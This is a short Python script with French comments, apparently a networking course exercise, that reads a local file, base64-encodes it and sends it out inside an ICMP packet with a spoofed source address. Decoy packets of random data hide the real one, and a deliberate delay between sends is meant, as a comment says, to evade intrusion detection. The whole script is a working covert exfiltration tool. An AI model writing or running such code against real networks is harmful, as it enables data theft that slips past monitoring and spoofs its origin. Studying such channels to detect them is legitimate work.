import random
import string
import time
from scapy.all import IP, ICMP, send, sniff
import base64

def generate_random_message():
    """ Génère un message aléatoire d'une longueur aleatoire entre 80 et 200. """
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for i in range(random.randint(80, 200)))

def send_file_in_icmp_request(file_path: str, ip_address: str):
    # Lecture du contenu du fichier
    with open(file_path, "rb") as f:
        file_contents = f.read()

    # Encodage du contenu du fichier
    encoded_file_contents = base64.b64encode(file_contents)
    # Longueur du contenu du fichier réel encodé
    real_content_length = len(encoded_file_contents)

    # Création du paquet ICMP réel
    real_icmp_packet = IP(dst=ip_address, src=f"{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 200)}.200") / ICMP() / encoded_file_contents

    # Envoi de paquets ICMP factices avec des messages aléatoires de même longueur que le contenu réel
    n = random.randint(1, 10)  # Nombre de paquets factices à envoyer
    for i in range(1,10):  # Nombre total de paquets à envoyer
        if i == n:  # Envoie le paquet réel en premier
            send(real_icmp_packet)
        else:
            # Génère un message factice aléatoire de même longueur et l'encode en base64
            fake_message = generate_random_message()
            fake_icmp_packet = IP(dst=ip_address, src=f"{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 200)}.{random.randint(0, 199)}") / ICMP() / base64.b64encode(fake_message.encode('utf-8'))
            send(fake_icmp_packet)
        # Délai entre chaque paquet pour éviter la détection par les IDS
        time.sleep(0.5)

# Example usage
if __name__ == "__main__":
    file_path = "C:\\Users\\ayoub\\OneDrive\\Documents\\UBS\\A1\\Réseau\\Exfiltration_ICMP\\test2.txt"
    target_ip = "192.168.121.242"  # Replace with the target IP address
    send_file_in_icmp_request(file_path, target_ip)